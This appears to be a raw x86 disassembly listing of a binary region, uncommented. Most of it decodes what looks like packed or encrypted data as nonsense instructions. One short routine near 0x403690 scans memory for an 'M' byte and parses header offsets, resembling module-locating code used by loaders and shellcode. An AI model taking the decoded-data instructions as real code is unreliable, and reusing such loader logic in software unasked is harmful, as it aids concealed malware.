  403032:	scas   eax,DWORD PTR es:[edi]
  403033:	pop    ecx
  403034:	test   al,0xbf
  403036:	mov    edi,0x588059c3
  40303b:	and    al,0x12
  40303d:	mov    esi,0x15df465c
  403042:	xchg   DWORD PTR [ebx-0x64],ebp
  403045:	lods   al,BYTE PTR ds:[esi]
  403046:	bound  esi,QWORD PTR [edi]
  403048:	xchg   BYTE PTR [ecx+0x40],al
  40304b:	inc    eax
  40304c:	inc    ebx
  40304d:	int3   
  40304e:	add    BYTE PTR ds:0x56240,al
  403054:	inc    ebx
  403055:	inc    eax
  403056:	inc    eax
  403057:	add    BYTE PTR [ecx+0x62],al
  40305a:	bound  eax,QWORD PTR [eax]
  40305c:	int3   
  40305d:	inc    eax
  40305e:	inc    ebx
  40305f:	add    eax,0x43624041
  403064:	adc    BYTE PTR [ecx+0x5],al
  403067:	inc    eax
  403068:	or     eax,0xc59fdd44
  40306d:	or     al,BYTE PTR [eax-0x1]
  403070:	repnz test DWORD PTR [eax+0x40d08762],ebp
  403077:	or     ebp,DWORD PTR [edi]
  403079:	sub    al,BYTE PTR [eax+0x1]
  40307c:	inc    ebx
  40307d:	push   edx
  40307e:	inc    ebx
  40307f:	add    BYTE PTR [edx+eax*4+0x2a],bh
  403083:	stos   DWORD PTR es:[edi],eax
  403084:	sbb    edx,DWORD PTR [ebp-0x58]
  403087:	rcl    DWORD PTR [edi+0x2c],1
  40308a:	inc    edx
  40308b:	and    al,0x8c
  40308d:	cmp    al,0xac
  40308f:	sub    edx,DWORD PTR [ecx+0x52e33948]
  403095:	fnstcw WORD PTR ds:0x40436246
  40309b:	adc    BYTE PTR ds:0x4158cc40,al
  4030a1:	inc    ebx
  4030a2:	bound  eax,QWORD PTR [ecx+0x40]
  4030a5:	add    eax,0x4140
  4030aa:	and    eax,0x40400062
  4030af:	add    eax,0x84404340
  4030b4:	int3   
  4030b5:	js     0x4030b7
  4030b7:	inc    ecx
  4030b8:	adc    BYTE PTR [edx+0xf],ah
  4030bb:	inc    ebp
  4030bc:	sub    BYTE PTR [eax],0x50
  4030bf:	les    esi,FWORD PTR [ecx+eax*8-0x59]
  4030c3:	mov    ah,0x21
  4030c5:	bound  eax,QWORD PTR [edx+0x4f]
  4030c8:	bound  ebp,QWORD PTR [edx+ecx*4+0x4e01ca62]
  4030cf:	out    dx,al
  4030d0:	mov    ah,0x4b
  4030d2:	stos   BYTE PTR es:[edi],al
  4030d3:	inc    edx
  4030d4:	add    edx,DWORD PTR [eax+0x5015c620]
  4030da:	in     al,0x30
  4030dc:	sbb    DWORD PTR [esi],edi
  4030de:	loopne 0x403134
  4030e0:	leave  
  4030e1:	xchg   esp,eax
  4030e2:	loope  0x4030e4
  4030e4:	inc    eax
  4030e5:	inc    ecx
  4030e6:	inc    eax
  4030e7:	inc    ebx
  4030e8:	bound  ax,DWORD PTR ds:0x40434100
  4030ef:	add    eax,0x40054062
  4030f4:	bound  eax,QWORD PTR [ecx+0x40]
  4030f7:	inc    ebx
  4030f8:	inc    eax
  4030f9:	add    eax,0x25405841
  4030fe:	bound  eax,QWORD PTR [eax+0x43]
  403101:	inc    eax
  403102:	adc    BYTE PTR [edi-0x7b],dh
  403105:	xor    eax,0x2db0a0bc
  40310a:	inc    esi
  40310b:	inc    eax
  40310c:	stos   DWORD PTR es:[edi],eax
  40310d:	ins    DWORD PTR es:[edi],dx
  40310e:	test   al,0x28
  403110:	inc    ecx
  403111:	fs stc 
  403113:	add    ecx,DWORD PTR [edi]
  403115:	add    BYTE PTR [edx+0x20],0x42
  403119:	test   al,0x9f
  40311b:	sub    BYTE PTR [edx],al
  40311d:	arpl   WORD PTR [edx],bp
  40311f:	push   cs
  403120:	cld    
  403121:	adc    DWORD PTR [edi],ebp
  403123:	inc    edx
  403124:	and    DWORD PTR [esi+0x40],ebp
  403127:	inc    ecx
  403128:	inc    ebx
  403129:	inc    eax
  40312a:	add    eax,0x43406262
  40312f:	inc    ecx
  403130:	adc    BYTE PTR [eax],al
  403132:	inc    eax
  403133:	add    eax,0x43000562
  403138:	add    BYTE PTR [ecx+0x40],al
  40313b:	inc    eax
  40313c:	add    eax,0x400062
  403141:	inc    ebx
  403142:	inc    eax
  403143:	js     0x403186
  403145:	inc    ecx
  403146:	bound  eax,QWORD PTR [eax+0x42]
  403149:	lea    ebp,[esi+0x44]
  40314c:	fcom   DWORD PTR [eax]
  40314e:	push   es
  40314f:	and    al,0x9
  403151:	bound  edx,QWORD PTR [eax+edx*2+0x77]
  403155:	add    DWORD PTR [ebx+0x5512d044],eax
  40315b:	or     al,0x48
  40315d:	inc    edi
  40315e:	or     DWORD PTR [eax-0x3422039d],ebx
  403164:	jl     0x4031d6
  403166:	add    eax,0xc0a84fa8
  40316b:	bound  eax,QWORD PTR [eax+0x5]
  40316e:	inc    ecx
  40316f:	add    BYTE PTR [ebx+0x40],al
  403172:	inc    eax
  403173:	inc    ecx
  403174:	inc    eax
  403175:	inc    eax
  403176:	bound  eax,QWORD PTR ds:0x5624300
  40317c:	add    BYTE PTR [eax+0x40],al
  40317f:	add    BYTE PTR [ecx+0x43],al
  403182:	add    BYTE PTR [eax+0x41],al
  403185:	add    eax,0x40436200
  40318a:	inc    eax
  40318b:	add    eax,0x750f4862
  403190:	imul   esp,DWORD PTR [ebx+0x40],0x51
  403194:	clc    
  403195:	add    BYTE PTR [edi],cl
  403197:	inc    eax
  403198:	adc    DWORD PTR [ebx+0x477f977f],0x62506393
  4031a2:	sub    BYTE PTR [ebx-0x30],dl
  4031a5:	test   DWORD PTR [edi],esi
  4031a7:	inc    eax
  4031a8:	add    esp,0x4041bf40
  4031ae:	add    eax,0x41624340
  4031b3:	test   BYTE PTR [eax],al
  4031b5:	and    eax,0x404043
  4031ba:	add    BYTE PTR ds:0x626210,al
  4031c0:	add    eax,0x43404140
  4031c5:	inc    eax
  4031c6:	inc    ecx
  4031c7:	add    eax,0x10664062
  4031cc:	inc    ebx
  4031cd:	bound  esp,QWORD PTR [ebx-0x10]
  4031d0:	cld    
  4031d1:	jp     0x4031de
  4031d3:	dec    edi
  4031d4:	add    DWORD PTR [edi-0x1f0f98f5],edi
  4031da:	or     DWORD PTR [ebx+ebp*4-0x41],0x54f54adc
  4031e2:	dec    ebx
  4031e3:	sub    ch,BYTE PTR [eax]
  4031e5:	inc    esp
  4031e6:	push   esp
  4031e7:	in     al,0x70
  4031e9:	dec    DWORD PTR [ecx]
  4031eb:	xchg   esi,eax
  4031ec:	sub    ch,cl
  4031ee:	cmp    eax,0xff4c5c06
  4031f3:	mov    ch,0x69
  4031f5:	inc    edx
  4031f6:	ret    
  4031f7:	mov    WORD PTR [edi+0x47a86754],cs
  4031fd:	mov    ebx,0x41cc0570
  403202:	inc    eax
  403203:	add    BYTE PTR [eax],al
  403205:	add    BYTE PTR [eax+0x40],al
  403208:	inc    ebx
  403209:	bound  eax,QWORD PTR [eax]
  40320b:	inc    eax
  40320c:	inc    eax
  40320d:	add    eax,0x62434162
  403212:	inc    eax
  403213:	js     0x403225
  403215:	inc    ecx
  403216:	add    eax,0x5404325
  40321b:	bound  eax,QWORD PTR [eax+0x40]
  40321e:	inc    ecx
  40321f:	inc    ebx
  403220:	cmp    ah,BYTE PTR fs:[ebp+0x1]
  403224:	dec    eax
  403225:	jg     0x4031c3
  403227:	and    ebx,DWORD PTR [edx-0x74]
  40322a:	inc    esp
  40322b:	jl     0x40326e
  40322d:	and    BYTE PTR [edx+0x4d],ah
  403230:	cmp    al,0x38
  403232:	rol    DWORD PTR [ecx],1
  403234:	inc    ebp
  403235:	ror    DWORD PTR [ecx+0x38],0x4c
  403239:	inc    edx
  40323a:	dec    ebp
  40323b:	dec    esp
  40323c:	mov    esp,0x80514cc
  403241:	je     0x40321f
  403243:	add    ah,BYTE PTR [edi+0x58]
  403246:	push   edx
  403247:	and    eax,0x436241
  40324c:	adc    BYTE PTR [eax+0x0],al
  40324f:	add    eax,0x62410040
  403254:	inc    eax
  403255:	add    BYTE PTR [ebx-0x34],al
  403258:	inc    eax
  403259:	add    eax,0x78434040
  40325e:	bound  eax,QWORD PTR [ecx+0x78]
  403261:	add    eax,0x62404043
  403266:	test   al,0xcb
  403268:	mov    esp,DWORD PTR [edx+0x60]
  40326b:	push   ebp
  40326c:	test   al,0xdb
  40326e:	adc    BYTE PTR [eax-0x5b],cl
  403271:	inc    eax
  403272:	inc    ebp
  403273:	sub    al,0x47
  403275:	les    esi,FWORD PTR [eax+0x57d3d05]
  40327b:	push   0x42414f2a
  403280:	jle    0x40321a
  403282:	jno    0x403204
  403284:	inc    ecx
  403285:	inc    eax
  403286:	push   ebp
  403287:	inc    ecx
  403288:	jbe    0x4032cb
  40328a:	inc    eax
  40328b:	add    eax,0x43436240
  403290:	add    eax,0x62004040
  403295:	inc    eax
  403296:	add    BYTE PTR [ecx+0x40],al
  403299:	inc    ebx
  40329a:	test   BYTE PTR ds:0x58054041,ah
  4032a0:	inc    eax
  4032a1:	inc    eax
  4032a2:	bound  eax,QWORD PTR [eax+0x66]
  4032a5:	inc    ecx
  4032a6:	inc    eax
  4032a7:	add    eax,0x73024100
  4032ac:	or     al,BYTE PTR [esp+edi*8+0x21f5c43c]
  4032b3:	xchg   ecx,eax
  4032b4:	jo     0x4032f3
  4032b6:	inc    esi
  4032b7:	jle    0x4032a8
  4032b9:	pusha  
  4032ba:	pop    ebp
  4032bb:	mov    edi,0xc420c362
  4032c0:	std    
  4032c1:	push   ecx
  4032c2:	add    DWORD PTR [eax],ebx
  4032c4:	inc    eax
  4032c5:	test   ah,cl
  4032c7:	dec    edi
  4032c8:	stos   DWORD PTR es:[edi],eax
  4032c9:	inc    ecx
  4032ca:	lods   eax,DWORD PTR ds:[esi]
  4032cb:	or     BYTE PTR [edx],ch
  4032cd:	add    eax,0x70b340dc
  4032d2:	addr16 inc ebx
  4032d4:	xlat   BYTE PTR ds:[ebx]
  4032d5:	leave  
  4032d6:	jle    0x4032d8
  4032d8:	add    BYTE PTR [ebx+0x40],al
  4032db:	bound  eax,QWORD PTR ds:0x25404110
  4032e1:	add    ah,cl
  4032e3:	inc    ebx
  4032e4:	add    eax,0x40402562
  4032e9:	add    BYTE PTR [eax+0x40],al
  4032ec:	inc    ecx
  4032ed:	inc    ecx
  4032ee:	add    eax,0x78434025
  4032f3:	bound  eax,QWORD PTR [eax-0x7c]
  4032f6:	inc    eax
  4032f7:	inc    ecx
  4032f8:	inc    esp
  4032f9:	call   0xbe82f522
  4032fe:	inc    esp
  4032ff:	or     al,0x3a
  403301:	int    0x49
  403303:	sub    eax,0x6248ac34
  403308:	ret    
  403309:	cmp    eax,0xcb452952
  40330e:	xchg   edx,eax
  40330f:	adc    eax,0xc57c434c
  403314:	test   al,0x15
  403316:	les    ebp,FWORD PTR [eax+0xd547711]
  40331c:	mov    edi,0xcb65631a
  403321:	loope  0x4032e0
  403323:	enter  0x872a,0x30
  403327:	cmp    eax,0x2b566448
  40332c:	inc    ecx
  40332d:	gs inc ecx
  40332f:	inc    eax
  403330:	inc    eax
  403331:	inc    ebx
  403332:	int3   
  403333:	add    BYTE PTR ds:0x56240,al
  403339:	inc    ebx
  40333a:	inc    eax
  40333b:	inc    eax
  40333c:	add    BYTE PTR [ecx+0x62],al
  40333f:	bound  eax,QWORD PTR [eax]
  403341:	int3   
  403342:	inc    eax
  403343:	inc    ebx
  403344:	add    eax,0x43624041
  403349:	adc    BYTE PTR [ecx+0x5],al
  40334c:	inc    eax
  40334d:	cwde   
  40334e:	mov    DWORD PTR ds:0x7de851b5,ecx
  403354:	sbb    ch,0xd1
  403357:	dec    ecx
  403358:	pop    ecx
  403359:	stos   DWORD PTR es:[edi],eax
  40335a:	rcl    DWORD PTR [eax+0x73],0x63
  40335e:	addr16 dec ebx
  403360:	bound  eax,QWORD PTR [ebx+0x40]
  403363:	adc    BYTE PTR ds:0x4158cc40,al
  403369:	inc    ebx
  40336a:	bound  eax,QWORD PTR [ecx+0x40]
  40336d:	add    eax,0x4140
  403372:	and    eax,0x40400062
  403377:	add    eax,0x84404340
  40337c:	int3   
  40337d:	js     0x40337f
  40337f:	inc    ecx
  403380:	adc    BYTE PTR [edx+0xf],ah
  403383:	add    DWORD PTR [ebx+edx*2+0x62],eax
  403387:	nop
  403388:	sar    BYTE PTR [eax+edi*1-0x5c3e4819],0xbf
  403390:	sbb    al,0x71
  403392:	push   cs
  403393:	cmp    al,BYTE PTR [eax-0x2e]
  403396:	dec    esi
  403397:	inc    eax
  403398:	pop    edx
  403399:	out    dx,eax
  40339a:	(bad)  
  40339b:	ficom  WORD PTR [ecx+eax*8-0x58]
  40339f:	add    BYTE PTR [eax+0x41],al
  4033a2:	inc    eax
  4033a3:	inc    ebx
  4033a4:	bound  ax,DWORD PTR ds:0x40434100
  4033ab:	add    eax,0x40054062
  4033b0:	bound  eax,QWORD PTR [ecx+0x40]
  4033b3:	inc    ebx
  4033b4:	inc    eax
  4033b5:	add    eax,0x25405841
  4033ba:	bound  eax,QWORD PTR [eax+0x43]
  4033bd:	inc    eax
  4033be:	adc    BYTE PTR [eax+0x38],al
  4033c1:	cmp    al,0x4f
  4033c3:	mov    al,0x70
  4033c5:	not    DWORD PTR [eax-0x7f24a7c0]
  4033cb:	mov    al,0x40
  4033cd:	inc    esp
  4033ce:	inc    ecx
  4033cf:	fsub   QWORD PTR [edx+0x28]
  4033d2:	lds    edx,FWORD PTR [edi+0x50]
  4033d5:	ror    DWORD PTR [ebx-0x40],0x48
  4033d9:	sbb    al,0x50
  4033db:	stos   DWORD PTR es:[edi],eax
  4033dc:	js     0x40343b
  4033de:	sub    al,0x46
  4033e0:	and    al,0x80
  4033e2:	inc    ebx
  4033e3:	stos   BYTE PTR es:[edi],al
  4033e4:	inc    esp
  4033e5:	ret    
  4033e6:	push   ebx
  4033e7:	inc    ebx
  4033e8:	in     eax,0x62
  4033ea:	data16 (bad) 
  4033ec:	stc    
  4033ed:	dec    DWORD PTR [ecx+0x34]
  4033f0:	bound  eax,QWORD PTR [ebp+0x3c]
  4033f3:	inc    BYTE PTR [ebp+0x40]
  4033f6:	inc    ecx
  4033f7:	inc    ebx
  4033f8:	inc    eax
  4033f9:	add    eax,0x43406262
  4033fe:	inc    ecx
  4033ff:	adc    BYTE PTR [eax],al
  403401:	inc    eax
  403402:	add    eax,0x43000562
  403407:	add    BYTE PTR [ecx+0x40],al
  40340a:	inc    eax
  40340b:	add    eax,0x400062
  403410:	inc    ebx
  403411:	inc    eax
  403412:	js     0x403455
  403414:	inc    ecx
  403415:	bound  eax,QWORD PTR [eax-0x3d]
  403418:	les    edx,FWORD PTR [ecx+0x47]
  40341b:	mov    esp,0x14d87dbc
  403420:	pop    ebx
  403421:	test   al,0x54
  403423:	inc    ecx
  403424:	cmp    dh,BYTE PTR [ecx+esi*2-0x57d2573e]
  40342b:	pusha  
  40342c:	test   al,0xfe
  40342e:	xchg   esi,eax
  40342f:	das    
  403430:	inc    ecx
  403431:	xor    dl,BYTE PTR [edx]
  403433:	pop    ecx
  403434:	adc    BYTE PTR [esi+0x62],dl
  403437:	inc    eax
  403438:	add    eax,0x40430041
  40343d:	inc    eax
  40343e:	inc    ecx
  40343f:	inc    eax
  403440:	inc    eax
  403441:	bound  eax,QWORD PTR ds:0x5624300
  403447:	add    BYTE PTR [eax+0x40],al
  40344a:	add    BYTE PTR [ecx+0x43],al
  40344d:	add    BYTE PTR [eax+0x41],al
  403450:	add    eax,0x40436200
  403455:	inc    eax
  403456:	add    eax,0x2a4e4962
  40345b:	mov    ebx,0xc0642cec
  403460:	rol    eax,1
  403462:	dec    eax
  403463:	call   0xe54238aa
  403468:	pop    esp
  403469:	pusha  
  40346a:	inc    edx
  40346b:	test   al,0x16
  40346d:	adc    bl,cl
  40346f:	sbb    eax,0xacf540d0
  403474:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403475:	dec    eax
  403476:	inc    esp
  403477:	pop    edx
  403478:	sub    eax,eax
  40347a:	inc    esp
  40347b:	inc    ecx
  40347c:	inc    eax
  40347d:	add    eax,0x41624340
  403482:	test   BYTE PTR [eax],al
  403484:	and    eax,0x404043
  403489:	add    BYTE PTR ds:0x626210,al
  40348f:	add    eax,0x43404140
  403494:	inc    eax
  403495:	inc    ecx
  403496:	add    eax,0x10664062
  40349b:	inc    ebx
  40349c:	(bad)  
  40349d:	retf   
  40349e:	push   esp
  40349f:	and    ch,BYTE PTR [ebx+esi*8+0x49]
  4034a3:	mov    ch,0x63
  4034a5:	adc    eax,0x9b2cf440
  4034aa:	icebp  
  4034ab:	sub    al,0x35
  4034ad:	inc    ebx
  4034ae:	inc    eax
  4034af:	test   al,0x68
  4034b1:	adc    eax,0x6fa87457
  4034b6:	inc    ecx
  4034b7:	adc    DWORD PTR [eax],ecx
  4034b9:	inc    eax
  4034ba:	xchg   ecx,eax
  4034bb:	ret    
  4034bc:	inc    eax
  4034bd:	pop    esp
  4034be:	cwde   
  4034bf:	dec    eax
  4034c0:	retf   
  4034c1:	fnsave [eax+0x69]
  4034c4:	add    DWORD PTR [edx-0x3c],esp
  4034c7:	inc    ecx
  4034c8:	pop    eax
  4034c9:	fwait
  4034ca:	push   ecx
  4034cb:	mov    BYTE PTR [edx],0xe8
  4034ce:	dec    edi
  4034cf:	int    0x2b
  4034d1:	fisttp QWORD PTR [ebp+eax*1-0x34]
  4034d5:	inc    ecx
  4034d6:	inc    eax
  4034d7:	add    BYTE PTR [eax],al
  4034d9:	add    BYTE PTR [eax+0x40],al
  4034dc:	inc    ebx
  4034dd:	bound  eax,QWORD PTR [eax]
  4034df:	inc    eax
  4034e0:	inc    eax
  4034e1:	add    eax,0x62434162
  4034e6:	inc    eax
  4034e7:	js     0x4034f9
  4034e9:	inc    ecx
  4034ea:	add    eax,0x5404325
  4034ef:	bound  eax,QWORD PTR [eax+0x40]
  4034f2:	inc    ecx
  4034f3:	inc    ebx
  4034f4:	ins    BYTE PTR es:[edi],dx
  4034f5:	add    BYTE PTR ds:0xcc48e043,al
  4034fb:	adc    edx,eax
  4034fd:	sub    bl,cl
  4034ff:	inc    ecx
  403500:	bound  eax,QWORD PTR [edx+0x40c1500e]
  403506:	xchg   edx,eax
  403507:	int3   
  403508:	gs ret 
  40350a:	out    0x91,eax
  40350c:	cld    
  40350d:	sub    al,BYTE PTR [ecx-0x8]
  403510:	ins    BYTE PTR es:[edi],dx
  403511:	dec    esp
  403512:	cs lahf 
  403514:	rol    DWORD PTR [esi-0x3d],0xc3
  403518:	bound  eax,QWORD PTR [ecx+0x30]
  40351b:	and    eax,0x436241
  403520:	adc    BYTE PTR [eax+0x0],al
  403523:	add    eax,0x62410040
  403528:	inc    eax
  403529:	add    BYTE PTR [ebx-0x34],al
  40352c:	inc    eax
  40352d:	add    eax,0x78434040
  403532:	bound  eax,QWORD PTR [ecx+0x78]
  403535:	add    eax,0x62404043
  40353a:	dec    esp
  40353b:	push   esi
  40353c:	ins    DWORD PTR es:[edi],dx
  40353d:	and    BYTE PTR [edi+0x7b4379b8],bh
  403543:	rcl    DWORD PTR [eax-0x77ea409c],0xbb
  40354a:	push   esi
  40354b:	in     eax,dx
  40354c:	(bad)  
  40354d:	rcl    BYTE PTR [ebx],1
  40354f:	leave  
  403550:	add    BYTE PTR [ecx+0x40],0x5
  403554:	inc    eax
  403555:	bound  eax,QWORD PTR [ebx+0x43]
  403558:	add    eax,0x62004040
  40355d:	inc    eax
  40355e:	add    BYTE PTR [ecx+0x40],al
  403561:	inc    ebx
  403562:	test   BYTE PTR ds:0x58054041,ah
  403568:	inc    eax
  403569:	inc    eax
  40356a:	bound  eax,QWORD PTR [eax+0x66]
  40356d:	inc    ecx
  40356e:	inc    eax
  40356f:	add    eax,0xc251e700
  403574:	fs inc ebx
  403576:	dec    esi
  403577:	mov    ah,0xc3
  403579:	inc    ebp
  40357a:	inc    esi
  40357b:	das    
  40357c:	and    al,0x2e
  40357e:	test   al,0x41
  403580:	dec    esp
  403581:	push   edx
  403582:	push   ecx
  403583:	cmp    DWORD PTR [ebp+0x6f],eax
  403586:	inc    esp
  403587:	inc    esi
  403588:	js     0x403554
  40358a:	dec    esp
  40358b:	push   esi
  40358c:	xchg   DWORD PTR [eax],eax
  40358e:	add    BYTE PTR [ebx+0x40],al
  403591:	bound  eax,QWORD PTR ds:0x25404110
  403597:	add    ah,cl
  403599:	inc    ebx
  40359a:	add    eax,0x40402562
  40359f:	add    BYTE PTR [eax+0x40],al
  4035a2:	inc    ecx
  4035a3:	inc    ecx
  4035a4:	add    eax,0x78434025
  4035a9:	bound  eax,QWORD PTR [eax-0x7c]
  4035ac:	inc    eax
  4035ad:	inc    ecx
  4035ae:	test   al,0x6d
  4035b0:	cld    
  4035b1:	fist   WORD PTR [esi+0x19]
  4035b4:	ror    BYTE PTR [edx+0x11],0x24
  4035b8:	outs   dx,BYTE PTR ds:[esi]
  4035b9:	adc    DWORD PTR [esi],ebp
  4035bb:	inc    ebx
  4035bc:	and    dh,BYTE PTR ds:0x1c4c53f8
  4035c2:	and    BYTE PTR [ebx+0x54141e7],bl
  4035c8:	jne    0x40362c
  4035ca:	add    BYTE PTR [ecx-0x3f],0x5f
  4035ce:	ja     0x403557
  4035d0:	ffree  st(4)
  4035d2:	xchg   ebx,eax
  4035d3:	(bad)  
  4035d4:	pop    eax
  4035d5:	and    BYTE PTR [eax],ah
  4035d7:	outs   dx,BYTE PTR ds:[esi]
  4035d8:	or     al,0x4f
  4035da:	inc    ecx
  4035db:	jae    0x40359d
  4035dd:	mov    esi,0x4041e244
  4035e2:	inc    eax
  4035e3:	inc    ebx
  4035e4:	int3   
  4035e5:	add    BYTE PTR ds:0x56240,al
  4035eb:	inc    ebx
  4035ec:	inc    eax
  4035ed:	inc    eax
  4035ee:	add    BYTE PTR [ecx+0x62],al
  4035f1:	bound  eax,QWORD PTR [eax]
  4035f3:	int3   
  4035f4:	inc    eax
  4035f5:	inc    ebx
  4035f6:	add    eax,0x43624041
  4035fb:	adc    BYTE PTR [ecx+0x5],al
  4035fe:	inc    eax
  4035ff:	cmp    BYTE PTR [eax+0x13],al
  403602:	inc    ecx
  403603:	ss pop ds
  403605:	push   esp
  403606:	gs gs cwde 
  403609:	and    al,0xd0
  40360b:	imul   ebp,DWORD PTR [eax+0x3d118239],0x4c2bdf7
  403615:	bound  eax,QWORD PTR [ebx+0x40]
  403618:	adc    BYTE PTR ds:0x4158cc40,al
  40361e:	inc    ebx
  40361f:	bound  eax,QWORD PTR [ecx+0x40]
  403622:	add    eax,0x4140
  403627:	and    eax,0x40400062
  40362c:	add    eax,0x84404340
  403631:	int3   
  403632:	js     0x403634
  403634:	inc    ecx
  403635:	adc    BYTE PTR [edx+0xf],ah
  403638:	scas   al,BYTE PTR es:[edi]
  403639:	pop    ebp
  40363a:	cmp    bl,al
  40363c:	sub    al,0x27
  40363e:	xor    dh,BYTE PTR [ecx*4+0x664c75c9]
  403645:	fistp  WORD PTR [edx]
  403647:	inc    edx
  403648:	test   al,0x80
  40364a:	cmp    al,0x8
  40364c:	ds hlt 
  40364e:	dec    esi
  40364f:	arpl   WORD PTR [eax],dx
  403651:	inc    esi
  403652:	test   al,0xc9
  403654:	retf   0xc024
  403657:	xor    BYTE PTR [ebp+esi*4+0x40009830],dh
  40365e:	inc    ecx
  40365f:	inc    eax
  403660:	inc    ebx
  403661:	bound  ax,DWORD PTR ds:0x40434100
  403668:	add    eax,0x40054062
  40366d:	bound  eax,QWORD PTR [ecx-0x34]
  403670:	mov    eax,DWORD PTR [edi]
  403672:	push   ecx
  403673:	mov    ecx,eax
  403675:	dec    eax
  403676:	call   0x41b000
  40367b:	dec    edx
  40367c:	je     0x403683
  40367e:	pop    ecx
  40367f:	mov    eax,edx
  403681:	inc    edi
  403682:	ret    
  403683:	sub    esi,ebx
  403685:	mov    edx,ebx
  403687:	jmp    0x40367e
  403689:	int3   
  40368a:	int3   
  40368b:	int3   
  40368c:	int3   
  40368d:	int3   
  40368e:	int3   
  40368f:	int3   
  403690:	push   ebp
  403691:	mov    ebp,esp
  403693:	sub    esp,0x10
  403696:	mov    edx,DWORD PTR ds:0x430743
  40369c:	mov    eax,DWORD PTR [ebp+0x8]
  40369f:	call   0x412930
  4036a4:	sub    eax,edx
  4036a6:	mov    ecx,DWORD PTR [eax]
  4036a8:	cmp    cl,0x4d
  4036ab:	jne    0x4036a4
  4036ad:	push   ebx
  4036ae:	call   0x403720
  4036b3:	inc    ecx
  4036b4:	push   esi
  4036b5:	push   edi
  4036b6:	inc    ecx
  4036b7:	cmp    WORD PTR [eax],cx
  4036ba:	jne    0x403713
  4036bc:	call   0x41b090
  4036c1:	xor    edx,edx
  4036c3:	mov    ebx,DWORD PTR [ebp+0xc]
  4036c6:	mov    ecx,edx
  4036c8:	dec    ebx
  4036c9:	call   0x401000
  4036ce:	dec    ecx
  4036cf:	mov    DWORD PTR [ebp-0x10],ecx
  4036d2:	xor    eax,eax
  4036d4:	mov    DWORD PTR [ebp-0x8],eax
  4036d7:	mov    ecx,DWORD PTR [edi]
  4036d9:	dec    ecx
  4036da:	add    ecx,DWORD PTR [ebp-0x4]
  4036dd:	call   0x410020
  4036e2:	cmp    eax,ebx
  4036e4:	jne    0x4036ef
  4036e6:	call   0x41afe0
  4036eb:	test   eax,eax
  4036ed:	je     0x403700
  4036ef:	inc    edi
  4036f0:	inc    edi
  4036f1:	inc    DWORD PTR [ebp-0x8]
  4036f4:	inc    edi
  4036f5:	inc    edi
  4036f6:	mov    eax,DWORD PTR [ebp-0x8]
  4036f9:	mov    ecx,DWORD PTR [ebp-0xc]
  4036fc:	cmp    eax,ecx
  4036fe:	jb     0x4036d7
  403700:	mov    eax,DWORD PTR [ebp-0x8]
  403703:	mov    ecx,DWORD PTR [ebp-0xc]
  403706:	cmp    eax,ecx
  403708:	jae    0x403713
  40370a:	call   0x4180a0
  40370f:	add    eax,ecx
  403711:	jmp    0x403715
  403713:	xor    eax,eax
  403715:	pop    edi
  403716:	pop    esi
  403717:	pop    ebx
  403718:	leave  
  403719:	ret    0x8
  40371c:	int3   
  40371d:	int3   
  40371e:	int3   
  40371f:	int3   
  403720:	mov    ecx,eax
  403722:	mov    DWORD PTR [ebp-0x4],ecx
  403725:	mov    ecx,DWORD PTR [ecx+0x3a]
  403728:	shr    ecx,0x10
  40372b:	add    eax,ecx
  40372d:	mov    ecx,0x109
  403732:	add    eax,0x19
  403735:	dec    eax
  403736:	ret    
  403737:	int3   
  403738:	int3   
  403739:	int3   
  40373a:	int3   
  40373b:	int3   
  40373c:	int3   
  40373d:	int3   
  40373e:	int3   
  40373f:	int3   
  403740:	inc    eax
  403741:	inc    ebx
  403742:	inc    eax
  403743:	add    eax,0x25405841
  403748:	bound  eax,QWORD PTR [eax+0x43]
  40374b:	inc    eax
  40374c:	adc    BYTE PTR [ebx+0x61],al
  40374f:	pusha  
  403750:	xchg   edi,eax
  403751:	inc    edx
  403752:	inc    BYTE PTR [eax]
  403754:	or     eax,0x18c45155
  403759:	cdq    
  40375a:	or     eax,0x429a4894
  40375f:	sar    DWORD PTR [edi+0x40d93d54],0x41
  403766:	inc    ebx
  403767:	inc    eax
  403768:	add    eax,0x43406262
  40376d:	inc    ecx
  40376e:	adc    BYTE PTR [eax],al
  403770:	inc    eax
  403771:	add    eax,0x43000562
  403776:	add    BYTE PTR [ecx+0x40],al
  403779:	inc    eax
  40377a:	add    eax,0x400062
  40377f:	inc    ebx
  403780:	inc    eax
  403781:	js     0x4037c4
  403783:	inc    ecx
  403784:	bound  eax,QWORD PTR [eax+0x78]
  403787:	scas   al,BYTE PTR es:[edi]
  403788:	jno    0x403762
  40378a:	jle    0x4037ee
  40378c:	pop    esi
  40378d:	mov    ch,0x28
  40378f:	dec    eax
  403790:	xor    al,cl
  403792:	bound  ebx,QWORD PTR [eax]
  403794:	cld    
  403795:	test   al,0x98
  403797:	lds    esi,FWORD PTR [eax+0x539545f]
  40379d:	adc    BYTE PTR ds:0x40c2304f,al
  4037a3:	mov    ch,0x18
  4037a5:	mov    ah,0xc9
  4037a7:	or     BYTE PTR ds:0x56627536,0x42
  4037ae:	inc    ebp
  4037af:	adc    BYTE PTR cs:[edx+eiz*2+0x40],ch
  4037b4:	add    eax,0x40430041
  4037b9:	inc    eax
  4037ba:	inc    ecx
  4037bb:	inc    eax
  4037bc:	inc    eax
  4037bd:	bound  eax,QWORD PTR ds:0x5624300
  4037c3:	add    BYTE PTR [eax+0x40],al
  4037c6:	add    BYTE PTR [ecx+0x43],al
  4037c9:	add    BYTE PTR [eax+0x41],al
  4037cc:	add    eax,0x40436200
  4037d1:	inc    eax
  4037d2:	add    eax,0x5c579762
  4037d7:	jne    0x4037a8
  4037d9:	test   eax,0xb25c11d
  4037de:	clc    
  4037df:	cld    
  4037e0:	arpl   WORD PTR [ebx],sp
  4037e2:	jp     0x4037e9
  4037e4:	test   al,0x26
  4037e6:	cli    
  4037e7:	and    DWORD PTR [edx-0x2e],edi
  4037ea:	inc    esp
  4037eb:	les    eax,FWORD PTR [eax-0x3e]
  4037ee:	inc    esi
  4037ef:	pop    edi
  4037f0:	test   al,0x0
  4037f2:	rol    BYTE PTR [ecx+0x40],1
  4037f5:	add    eax,0x41624340
  4037fa:	test   BYTE PTR [eax],al
  4037fc:	and    eax,0x404043
  403801:	add    BYTE PTR ds:0x626210,al
  403807:	add    eax,0x43404140
  40380c:	inc    eax
  40380d:	inc    ecx
  40380e:	add    eax,0x10664062
  403813:	inc    ebx
  403814:	(bad)  
  403815:	sti    
  403816:	sub    ah,BYTE PTR [ecx+0x44c3df6]
  40381c:	xor    al,0x2c
  40381e:	dec    edi
  40381f:	stos   DWORD PTR es:[edi],eax
